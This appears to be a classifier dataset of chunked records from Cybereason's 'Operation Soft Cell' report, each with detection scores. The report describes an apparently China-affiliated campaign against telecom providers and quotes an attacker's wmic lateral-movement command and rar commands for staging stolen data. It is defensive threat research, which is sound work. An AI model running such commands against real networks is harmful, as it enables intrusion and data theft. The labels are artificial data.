        "text": "\n\n\n\n\n\n\nOperation Soft Cell: A Worldwide Campaign Against Telecommunications Providers\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nBack to Cybereason.com\n\n\n\n\n\n\n\n\n\nAll Posts\nResearch\nPodcasts\nWebinars\nResources\nVideos\nNews\n\n\nSubscribe\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nSubscribe\n\n\n\n\nAll\nResearch\nPodcasts\nWebinars\nResources\nVideos\nNews\n\n\n\n\n\n\n\nSearch\n\n\nSubscribe\n\n\n\n\n\n\n \n            X\n        \n\n\n\n\nSearch\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nOperation Soft Cell: A Worldwide Campaign Against Telecommunications Providers\n\n\nWritten By\nCybereason Nocturnus\n\n\n\n\n\n\n\n\n\n\n\u00a0\nResearch by: Mor Levi, Assaf Dahan, and Amit Serper\nEXECUTIVE SUMMARY\n In 2018, the Cybereason Nocturnus team identified an advanced, persistent attack targeting global telecommunications providers carried out by a threat actor using tools and techniques commonly associated with Chinese-affiliated threat actors, such as APT10. \u00a0 This multi-wave attacks focused on obtaining data of specific, high-value targets and resulted in a complete takeover of the network.\n",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": false,
            "confidence": 0.29290783405303955
        },
        "prediction": {}
    },
    {
        "text": "Key Points\nEarlier this year, Cybereason identified an advanced, persistent attack targeting telecommunications providers that has been underway for years, soon after deploying into the environment.\n Cybereason spotted the attack and later supported the telecommunications provider through four more waves of the advanced persistent attack over the course of 6 months.\n Based on the data available to us, Operation Soft Cell has been active since at least 2012, though some evidence suggests even earlier activity by the threat actor against telecommunications providers.\n",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": true,
            "confidence": 0.5373600125312805
        },
        "prediction": {}
    },
    {
        "text": "The threat actor was attempting to steal all data stored in the active directory, compromising every single username and password in the organization, along with other personally identifiable information, billing data, call detail records, credentials, email servers, geo-location of users, and more.\n The tools and TTPs used are commonly associated with Chinese threat actors\nDuring the persistent attack, the attackers worked in waves- abandoning one thread of attack when it was detected and stopped, only to return months later with new tools and techniques.\n",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": false,
            "confidence": 0.480665385723114
        },
        "prediction": {}
    },
    {
        "text": "Security Recommendations\nAdd an additional security layer for web servers. For example, use WAF (Web Application FW) to prevent trivial attacks on Internet-facing web servers.\n",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": false,
            "confidence": 0.4754844009876251
        },
        "prediction": {}
    },
    {
        "text": "Make sure that all web servers and web services that are exposed are patched.\n Use an EDR tool to give visibility and immediate response capabilities when high severity incidents are detected.\n",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": false,
            "confidence": 0.48203790187835693
        },
        "prediction": {}
    },
    {
        "text": "Table of Contents\nINTRODUCTION\nANATOMY OF THE ATTACK\nINITIAL COMPROMISE: THE MODIFIED CHINA CHOPPER WEB SHELL\nRECONNAISSANCE AND CREDENTIAL STEALING\nLATERAL MOVEMENT\nMAINTAINING A LONG-TERM FOOTHOLD AND STEALING DATA\nDATA EXFILTRATION\nUNDERSTANDING THE MOTIVE\nTHREAT INTEL RESEARCH\nMETHODOLOGY\nCONCLUSION\n\nINTRODUCTION to operation soft cell\n\n\n\n\u00a0\nWatch our CEO Lior Div's keynote on the operation.\n",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": true,
            "confidence": 0.5319269895553589
        },
        "prediction": {}
    },
    {
        "text": "In 2018, 30% of the telecommunications providers reported sensitive customer information was stolen due to an attack. These telecommunications providers have been expanding in size, to the point where In the past thirteen years, mobile cellular phone subscribers have quadrupled in size and sit at 8 billion subscribers today. Due to their wide availability and the fundamental service they bring, telecommunications providers have become critical infrastructure for the majority of world powers.\n Watch the On-Demand Version of Our Operation Soft Cell Webinar\nMuch like telecommunication providers, many other critical infrastructure organizations provide a valuable targets for nation state threat actors, due to their high impact.",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": false,
            "confidence": 0.39757832884788513
        },
        "prediction": {}
    },
    {
        "text": "In studies, nearly a quarter of critical infrastructure organizations reported they had been hit by nation state attacks and 60% said disruptive cyber attacks are among the threats they are most worried about.\n",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": true,
            "confidence": 0.6537590622901917
        },
        "prediction": {}
    },
    {
        "text": "Threat actors, especially those at the level of nation state, are seeking opportunities to attack these organizations, conducting elaborate, advanced operations to gain leverage, seize strategic assets, and collect information.",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": true,
            "confidence": 0.57804936170578
        },
        "prediction": {}
    },
    {
        "text": "Last year, we identified a threat actor that has been operating in telecommunications provider environments for at least two years.",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": true,
            "confidence": 0.6174783110618591
        },
        "prediction": {}
    },
    {
        "text": "We performed a post-incident review of the attacks and were able to identify changes in the attack patterns along with new activity every quarter.\n",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": true,
            "confidence": 0.6938247084617615
        },
        "prediction": {}
    },
    {
        "text": "The threat actor mainly sought to obtain CDR data (call logs, cell tower locations, etc.)",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": true,
            "confidence": 0.6576822996139526
        },
        "prediction": {}
    },
    {
        "text": "This type of targeted cyber espionage is usually the work of nation state threat actors.\n We\u2019ve concluded with a high level of certainty that the threat actor is affiliated with China and is likely state sponsored. The tools and techniques used throughout these attacks are consistent with several Chinese threat actors, such as APT10, a threat actor believed to operate on behalf of the Chinese Ministry of State Security (MSS).\n\n",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": true,
            "confidence": 0.5474076867103577
        },
        "prediction": {}
    },
    {
        "text": "The attack began with a web shell running on a vulnerable, publicly-facing server, from which the attackers gathered information about the network and propagated across the network. The threat actor attempted to compromise critical assets, such as database servers, billing servers, and the active directory.",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": true,
            "confidence": 0.6488569974899292
        },
        "prediction": {}
    },
    {
        "text": "The second wave of the attack hit several months later with similar infiltration attempts, along with a modified version of the web shell and reconnaissance activities.",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": true,
            "confidence": 0.6709446310997009
        },
        "prediction": {}
    },
    {
        "text": "A game of cat and mouse between the threat actor and the defenders began, as they ceased and resumed their attack 2 more times in the span of a 4 month period.\n\n ",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": true,
            "confidence": 0.6463223695755005
        },
        "prediction": {}
    },
    {
        "text": "Anatomy of the Attack | Operation soft cell\n\nInitial Compromise: the Modified China Chopper Web Shell\nThe initial indicator of the attack was a malicious web shell that was detected on an IIS server, coming out of the w3wp.exe process. An investigation of the web shell, later classified as a modified version of the China Chopper web shell, uncovered several attack phases and TTPs.",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": true,
            "confidence": 0.5806072354316711
        },
        "prediction": {}
    },
    {
        "text": "The threat actor was able to leverage the web shell to run reconnaissance commands, steal credentials, and deploy other tools.\n\n ",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": true,
            "confidence": 0.7051973938941956
        },
        "prediction": {}
    },
    {
        "text": "China Chopper is a web shell first discovered in 2012 that is commonly used by malicious Chinese actors.",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": true,
            "confidence": 0.6457993984222412
        },
        "prediction": {}
    },
    {
        "text": "It is used to remotely control web servers, and has been used in many attacks against Australian web hosting providers.",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": true,
            "confidence": 0.5305736660957336
        },
        "prediction": {}
    },
    {
        "text": "The web shell parameters in this attack match to the China Chopper parameters, as described in FireEye\u2019s analysis of China Chopper.",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": true,
            "confidence": 0.6897483468055725
        },
        "prediction": {}
    },
    {
        "text": "This tool has been used by several Chinese-affiliated threat actors, such as APT 27 and APT 40.",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": false,
            "confidence": 0.49871715903282166
        },
        "prediction": {}
    },
    {
        "text": "It is important to note that this tool is widely available and can be used by other threat actors.\n\n",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": true,
            "confidence": 0.5459241271018982
        },
        "prediction": {}
    },
    {
        "text": "Reconnaissance and Credential Stealing\nThe threat actor launched a series of reconnaissance commands to try to obtain and enumerate information about the compromised machine, network architecture, users, and active directory enumeration.\n\n\n Example 1: Reconnaissance Commands\n\nExample 2: Reconnaissance Commands\n\nModified \u201cnbtscan\u201d\nOne of the reconnaissance commands was to run a modified nbtscan tool (\"NetBIOS nameserver scanner\") to identify available NetBIOS name servers locally or over the network.",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": true,
            "confidence": 0.5435104966163635
        },
        "prediction": {}
    },
    {
        "text": "Nbtscan has been used by APT10 in Operation Cloud Hopper to search for services of interest across the IT estate and footprint endpoints of interest.",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": true,
            "confidence": 0.5706036686897278
        },
        "prediction": {}
    },
    {
        "text": "NetBIOS Scanner execution as seen in the Cybereason solution.\n\n NetBIOS scanner is set to scan an internal IP range.\n\n Modified Mimikatz\nFollowing the reconnaissance phase, the threat actor attempted to dump credentials stored on the compromised machines. The most common credential stealing tool used by the threat actor was a modified mimikatz that dumps NTLM hashes. This version of mimikatz did not require any command line arguments, most likely in an attempt to avoid detection based on command-line auditing. The dumped hashes were used to authenticate to other machines via pass the hash.",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": false,
            "confidence": 0.3925516605377197
        },
        "prediction": {}
    },
    {
        "text": "Reverse engineering shows the similarity between maybemimi.exe and mimikatz.\n\n Mimikatz code from GitHub.\n\n maybemimi strings. \n\n",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": true,
            "confidence": 0.597499668598175
        },
        "prediction": {}
    },
    {
        "text": "In order to obtain credentials, the threat actor used another technique that can be seen in the below screenshots.",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": true,
            "confidence": 0.7074683904647827
        },
        "prediction": {}
    },
    {
        "text": "They dumped specific hives from the Windows Registry, such as the SAM hive, which contains password hashes.\n\n",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": true,
            "confidence": 0.6559769511222839
        },
        "prediction": {}
    },
    {
        "text": "Command-line arguments indicate SAM hive dumping.\n\n Lateral Movement\nOnce the threat actor mapped the network and obtained credentials (through net use), they began to move laterally. They were able to compromise critical assets including production servers and database servers, and they even managed to gain full control of the Domain Controller. The threat actor relied on WMI and PsExec to move laterally and install their tools across multiple assets.\n",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": true,
            "confidence": 0.5140838623046875
        },
        "prediction": {}
    },
    {
        "text": "The following example demonstrates how the threat actor moved laterally from the first machine, compromised by the modified version of the China Chopper web shell, to other machines inside the network.\n",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": true,
            "confidence": 0.72667396068573
        },
        "prediction": {}
    },
    {
        "text": "\"C:\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\ecp\\auth\\\"&wmic /node:[REDACTED] /user:\"[REDACTED]\" /password:\"[REDACTED]\" process call create a.bat&echo [S]&cd&echo [E]\nWMI command used by the threat actor to move laterally.\n\n",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": false,
            "confidence": 0.3937128484249115
        },
        "prediction": {}
    },
    {
        "text": "Maintaining a Long-term Foothold and Stealing Data\nThe threat actor abused the stolen credentials to create rogue, high-privileged domain user accounts which they then used to take malicious action.",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": true,
            "confidence": 0.6637768745422363
        },
        "prediction": {}
    },
    {
        "text": "By creating these accounts, they ensured they would maintain access between different waves of the attack.",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": true,
            "confidence": 0.6826785802841187
        },
        "prediction": {}
    },
    {
        "text": "Once the threat actor regains their foothold, they already have access to a high-privileged domain user account.",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": true,
            "confidence": 0.6869239807128906
        },
        "prediction": {}
    },
    {
        "text": "This significantly reduces the \u201cnoise\u201d of having to use credential dumpers repeatedly, which helped them evade detection.\n\n",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": true,
            "confidence": 0.6911229491233826
        },
        "prediction": {}
    },
    {
        "text": "PoisonIvy\nA second method the threat actor used to maintain access across the compromised assets was through the deployment of the PoisonIvy RAT (PIVY). This infamous RAT has been associated with many different Chinese threat actors, including APT10, APT1, and DragonOK. It is a powerful, multi-featured RAT that lets a threat actor take total control over a machine.",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": true,
            "confidence": 0.5655888319015503
        },
        "prediction": {}
    },
    {
        "text": "Among its most notable features are:\nRegistry Editor\nScreenshot Grabber\nCredential Stealer\nInteractive Shell\nFile Manager with Upload and Download Support\nProcess Monitor\nKeylogging and Various other Surveillance Features\n\n\n",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": true,
            "confidence": 0.642494797706604
        },
        "prediction": {}
    },
    {
        "text": "The control panel for PoisonIvy. Courtesy of Sam Bowne - samsclass.info\nWe assume the threat actor used PoisonIvy for keylogging and other surveillance features, as they had that functionality available to them as shown in the screenshot above.\u00a0\n The strain of PIVY in this attack used a DLL side-loading technique to stealthily load itself into memory.",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": true,
            "confidence": 0.5423508286476135
        },
        "prediction": {}
    },
    {
        "text": "The PIVY payload was dropped along with the trusted and signed Samsung tool (RunHelp.exe) in the following manner:\n\n\n\n\n\nA nullsoft installer package (NSIS) was created with a legitimate, signed Samsung tool in it.\n Once executed, the installer script within the NSIS package extracted the Samsung tool and added a fake DLL with the same name as a legitimate DLL (ssMUIDLL.dll), which is required by the application.\n The DLL contains a PIVY stager, which is then loaded by the Samsung tool.\n After the fake DLL was loaded by the Samsung tool, it decrypted a blob payload in the same folder, which contains the actual PIVY payload.\n",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": false,
            "confidence": 0.4670429527759552
        },
        "prediction": {}
    },
    {
        "text": "Post-persistence execution of PIVY, side-loaded into a legitimate Samsung application.\n PIVY\u2019s use of DLL side-loading to abuse Samsung tools is not new, and has been reported previously by Palo Alto. In 2016 it was used to attack pro-democratic activists in Hong Kong, most probably by Chinese threat actors.\n",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": false,
            "confidence": 0.43051669001579285
        },
        "prediction": {}
    },
    {
        "text": "\u26a0\ufe0f Note: Our team has reached out to and advised the targeted organizations on active containment actions. \n\n Secondary Web Shells\nIn later stages of the attack, the threat actor deployed two other custom-built web shells.",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": true,
            "confidence": 0.6434180736541748
        },
        "prediction": {}
    },
    {
        "text": "From these web shells, they launched reconnaissance commands, stole data, and dropped additional tools including portqry.exe, renamed cmd.exe, winrar, and the notorious hTran.\n\n Reconnaissance and lateral movement commands launched from the secondary web shell.\n\n Data Exfiltration\nThe threat actor exfiltrated stolen data using multiple different channels including web shells and hTran.\n\n Compressing the Stolen Data\nIn an attempt to hide the contents of the stolen data, the threat actor used winrar to compress and password-protect it.",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": false,
            "confidence": 0.42114880681037903
        },
        "prediction": {}
    },
    {
        "text": "The winrar binaries and compressed data were found mostly in the Recycle Bin folder, a TTP that was previously observed in APT10-related attacks, as well as others.",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": true,
            "confidence": 0.644225537776947
        },
        "prediction": {}
    },
    {
        "text": "This threat actor is known to stage the data in multi-part archives before exfiltration.\n The threat actor used the following commands to compress the data.\n\n",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": true,
            "confidence": 0.7310048341751099
        },
        "prediction": {}
    },
    {
        "text": "rar.exe a -k -r -s -m1 -[password] [REDACTED].rar [REDACTED].temp\nrar.exe a -k -r -s -m1 -[password] [REDACTED].rar [REDACTED].csv\nrar a -r -[password]",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": false,
            "confidence": 0.41202378273010254
        },
        "prediction": {}
    },
    {
        "text": "The contents of the compressed data was crucial in understanding the threat actor\u2019s motivation for the attack, as well as what type of information they were after.\n\n",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": true,
            "confidence": 0.7329128980636597
        },
        "prediction": {}
    },
    {
        "text": "In order to exfiltrate data from a network segment not connected to the Internet, the threat actor deployed a modified version of hTran.",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": true,
            "confidence": 0.666776180267334
        },
        "prediction": {}
    },
    {
        "text": "This \u2018connection bouncer\u2019 tool lets the threat actor redirect ports and connections between different networks and obfuscate C2 server traffic.",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": true,
            "confidence": 0.684566080570221
        },
        "prediction": {}
    },
    {
        "text": "There have been numerous reports of hTran being used by different Chinese threat actors, including: APT3, APT27 and DragonOK.\n",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": false,
            "confidence": 0.42862680554389954
        },
        "prediction": {}
    },
    {
        "text": "Many strings, including the debug messages, were intentionally changed and obfuscated in an attempt to evade detection and thwart efforts to identify the malware by antivirus and researchers.\n\n",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": true,
            "confidence": 0.6898038387298584
        },
        "prediction": {}
    },
    {
        "text": "Since the original source code for hTran is publicly available, we were able to compare the debug output to the original source code to show that it has indeed been modified.\n\n\n",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": true,
            "confidence": 0.7182526588439941
        },
        "prediction": {}
    },
    {
        "text": "By looking at the original source code, we were able to identify that this is supposed to be \u201cConnect error\u201d.\n\n\n",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": true,
            "confidence": 0.7149550914764404
        },
        "prediction": {}
    },
    {
        "text": "Understanding the Motive\nWhen you think of large breaches to big organizations, the first thing that comes to mind is usually payment data. An organization that provides services to a large customer base has a lot of credit card data, bank account information, and more personal data on its systems.",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": true,
            "confidence": 0.6202505230903625
        },
        "prediction": {}
    },
    {
        "text": "In contrast, when a nation state threat actor is attacking a big organization, the end goal is typically not financial, but rather intellectual property or sensitive information about their clients.\n",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": true,
            "confidence": 0.6228969693183899
        },
        "prediction": {}
    },
    {
        "text": "One of the most valuable pieces of data that telecommunications providers hold is Call Detail Records (CDRs). CDRs are a large subset of metadata that contains all details about calls, including:\n\nSource, Destination, and Duration of a Call\nDevice Details\nPhysical Location\nDevice Vendor and Version\n\nFor a nation state threat actor, obtaining access to this data gives them intimate knowledge of any individuals they wish to target on that network. It lets them answer questions like:\n\nWho are the individuals talking to?\nWhich devices are the individuals using?\nWhere are the individuals traveling?\n\nHaving this information becomes particularly valuable when nation-state threat actors are targeting foreign intelligence agents, politicians, opposition candidates in an election, or even law enforcement.\n\n\n Example 1: CDR Data\n\n\nExample 2: CDR Data\n\n\nExample 3: CDR Data\nBeyond targeting individual users, this attack is also alarming because of the threat posed by the control of a telecommunications provider.",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": false,
            "confidence": 0.33115506172180176
        },
        "prediction": {}
    },
    {
        "text": "A threat actor with total access to a telecommunications provider, as is the case here, can attack however they want passively and also actively work to sabotage the network.\n",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": true,
            "confidence": 0.6800023317337036
        },
        "prediction": {}
    },
    {
        "text": "This attack has widespread implications, not just for individuals, but also for organizations and countries alike. The use of specific tools and the choice to hide ongoing operations for years points to a nation state threat actor, most likely China.",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": true,
            "confidence": 0.5766400098800659
        },
        "prediction": {}
    },
    {
        "text": "This is another form of cyber warfare being used to establish a foothold and gather information undercover until they are ready to strike.\n",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": true,
            "confidence": 0.6215648055076599
        },
        "prediction": {}
    },
    {
        "text": "Threat Intel Research\nThe following sections detail the methodology and work process used to piece together the various stages and components of the attack. This work enabled us to not only reconstruct these attacks, but also to find additional artifacts and information regarding the threat actor and its operations.\n\n",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": true,
            "confidence": 0.6707258224487305
        },
        "prediction": {}
    },
    {
        "text": "Methodology\n\nStep 1: Creating and Maintaining an IOC Inventory\nThe first step in this process was to create a comprehensive list of indicators of compromise (IOCs) observed throughout the different stages of the attack.",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": true,
            "confidence": 0.6559447646141052
        },
        "prediction": {}
    },
    {
        "text": "This list included various indicators, such as file hashes, domains, IP addresses, file names, and registry/service names.",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": false,
            "confidence": 0.42683786153793335
        },
        "prediction": {}
    },
    {
        "text": "In addition to this, our reverse engineers were able to extract further IOCs from the collected samples, which have also been added to the list.\n The list of IOCs was periodically updated and fed back into our threat intel engine as more were discovered.\n\n",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": true,
            "confidence": 0.6295133233070374
        },
        "prediction": {}
    },
    {
        "text": "Step 2: Hunting for Known Evil\nEquipped with an ever-growing list of known IOCs, our team set out to hunt for \u201clow-hanging fruit\u201d across multiple environments. This step was done by using both internal sources, such as the Cybereason solution, as well as hunting for indicators in the wild.\n The hunt for \u201cknown evil\u201d yielded interesting results that helped uncover additional compromised assets as well as more parts of the attack infrastructure.\n\n Step 3: Threat Actor\u2019s Arsenal\nPerhaps one of the most interesting steps involved identifying and analyzing the tools the threat actor used throughout the attack. The combination of the preference of tools, sequence of use, and specifically how they are used during the attack says a lot about a threat actor, especially when it comes to attribution.\n",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": false,
            "confidence": 0.4099200367927551
        },
        "prediction": {}
    },
    {
        "text": "One of the more notable aspects was how the threat actor used mostly known tools that were customized for this specific attack.",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": true,
            "confidence": 0.7333815097808838
        },
        "prediction": {}
    },
    {
        "text": "Each tool was customized differently, and included re-writing the code, stripping debug symbols, string obfuscation, and embedding the victim\u2019s specific information within the tools\u2019 configuration.\n",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": true,
            "confidence": 0.6627585887908936
        },
        "prediction": {}
    },
    {
        "text": "However, the threat actor also used tools we were not able to attribute to any known tool. These tools were used in the later stages of the attack, once the operation was already discovered.",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": true,
            "confidence": 0.7098749876022339
        },
        "prediction": {}
    },
    {
        "text": "The threat actor made sure that each payload had a unique hash, and some payloads were packed using different types of packers, both known and custom.\n The main tools these attacks had in common are:\n\nWeb Shells\n\nA modified version of the China Chopper web shell was used for initial compromise.\n Custom-built web shells were used for later phases of the attack.\n\n Reconnaissance Tools\n\nA modified version of Nbtscan was used to identify available NetBIOS name servers locally or over the network.\n",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": true,
            "confidence": 0.5460712313652039
        },
        "prediction": {}
    },
    {
        "text": "Multiple Windows built-in tools were used for various tasks, including whoami, net.exe, ipconfig, netstat, portqry, and more.\n",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": false,
            "confidence": 0.4133512079715729
        },
        "prediction": {}
    },
    {
        "text": "WMI and PowerShell commands were used for various tasks.\n\n RAT\n\nPoisonIvy was used to maintain access across the compromised assets.\n",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": true,
            "confidence": 0.6519215106964111
        },
        "prediction": {}
    },
    {
        "text": "PlugX was used in some of the instances that we're aware of.\n\n Credential Dumpers\n\nA modified version of Mimikatz was used to dump credentials stored on the compromised machines.\n A PowerShell-based Mimikatz was also used to dump credentials stored on the compromised machines.\n\n Lateral movement\n\nWMI was used for lateral movement.\n PsExec was also used for lateral movement.\n\n Connection Proxy\n\nA modified version of hTran was used to exfiltrate stolen data.\n\n Compression tool\n\nWinrar was used to compress and password-protect stolen data.\n\n\n\n",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": false,
            "confidence": 0.40767380595207214
        },
        "prediction": {}
    },
    {
        "text": "Step 4: Creating a TTP-based Behavioral Profile\nOne of the key components of threat hunting is to create a TTP-based behavioral profile of the threat actor in question.",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": true,
            "confidence": 0.6356900930404663
        },
        "prediction": {}
    },
    {
        "text": "Malware payloads and operational infrastructure can be quickly changed or replaced over time, and as such, the task of tracking a threat actor can become quite difficult.\n For that reason, it is crucial to profile the threat actor and study its behavior, the tools it uses, and its techniques. These behavioral-based TTPs are less likely to change drastically, and are\\ key factors of any threat hunt or attribution efforts.\n The Cybereason solution is compatible with the MITRE ATT&CK framework, which made it easy to keep track of the observed TTPs and correlate the data with known threat actors.\n The following chart reflects the behavioral profile of the threat actor based on the most frequently observed techniques used throughout these attacks.\n\n",
        "source": "Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html",
        "detection": {
            "response": false,
            "confidence": 0.3983185887336731
        },
        "prediction": {}
    },
    {
        "text": "MITRE ATT&CK Techniques Breakdown\n\n\n\nInitial Access\nExecution\nPersistence\nPrivilege Escalation\nDefense Evasion\nCredential Access\n\n\nExploit Public-Facing Application\nCommand-line interface\nWeb Shell\nValid Accounts\nDLL-side Loading\nCredential Dumping\n\n\n\u00a0\nWindows Management Instrumentation\nCreate Account\nWeb Shell\nIndicator Removal from Tools\n\u00a0\n\n\n\u00a0\nPowerShell\n\u00a0\n\u00a0\nObfuscated Files or Information\n\u00a0\n\n\n\u00a0\n\u00a0\n\u00a0\n\u00a0\nMasquerading\n\u00a0\n\n\n\n\n\n\nDiscovery\nLateral Movement\nCollection\nCommand and Control\nExfiltration\nImpact\n\n\n\n\nSystem Network Configuration Discovery\nWindows Admin Shares\nData From Local System\nRemote File Copy\nData Compressed\n\u00a0\n\n\nRemote System Discovery\nPass the Hash\nData Staged\nConnection Proxy\nExfiltration Over Command and Control Channel\n\u00a0\n\n\nAccount Discovery\nRemote File Copy\nInput Capture\n\u00a0\n\u00a0\n\u00a0\n\n\nPermission Groups Discovery\n\u00a0\n\u00a0\n\u00a0\n\u00a0\n\u00a0\n\n\n\n\nStep 5: Mapping out the Infrastructure and Operational Activity\n\nReconstructing the Infrastructure\n",
